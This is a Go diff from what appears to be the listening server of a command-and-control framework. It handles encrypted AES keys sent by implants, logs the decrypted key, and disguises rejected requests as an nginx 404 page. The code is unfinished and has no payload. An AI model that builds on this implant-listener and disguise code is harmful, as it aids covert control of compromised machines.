@@ -11,7 +11,6 @@ import (
 	"AllSecure/TeamServer/implant"
 	"context"
 	"errors"
-	"fmt"
 	"github.com/gin-gonic/gin"
 	"io"
 	"log"
@@ -27,7 +26,9 @@ var (
 )
 
 func ProcessRequest(c *gin.Context) {
-
+	var (
+		decryptedKey []byte
+	)
 	body, err := io.ReadAll(c.Request.Body)
 	if err != nil {
 		panic(err)
@@ -41,16 +42,12 @@ func ProcessRequest(c *gin.Context) {
 		c.JSON(http.StatusInternalServerError, "Internal Server Error")
 	}
 
-	for _, byte := range data_package.EncryptedAESKey {
-		fmt.Printf("0x%02X ", byte)
-	}
-	log.Println("Size of the Encrypted AESKey: ", data_package.EncryptedAESKeySize)
-
-	err = Crypt.DecryptAESKey(data_package.EncryptedAESKey, data_package.EncryptedAESKeySize,
+	decryptedKey, err = Crypt.DecryptAESKey(data_package.EncryptedAESKey, data_package.EncryptedAESKeySize,
 		"C:\\Users\\Brendan Ortiz\\Documents\\GOProjcets\\AllSecure\\")
 	if err != nil {
 		c.JSON(http.StatusMovedPermanently, DenyRequest)
 	}
+	log.Println(decryptedKey)
 	//TODO: retrieve the implant data from implant itself, process it & send event to team server.
 
 	err = SendEvent("NewImplant")
@@ -63,7 +60,8 @@ func DenyRequest(c *gin.Context) {
 	c.Writer.WriteHeader(http.StatusNotFound)
 	html, err := os.ReadFile("C:\\Users\\Brendan Ortiz\\Documents\\GOProjcets\\AllSecure\\ListeningServer\\Assets\\NotFound.html")
 	if err != nil {
-		log.Println("Could not load not found html file")
+		log.Println("Could not load not found html file", err)
+		c.JSON(http.StatusInternalServerError, "Internal Server Error")
 	}
 	c.Header("Server", "nginx")
 	c.Header("Content-Type", "text/html")
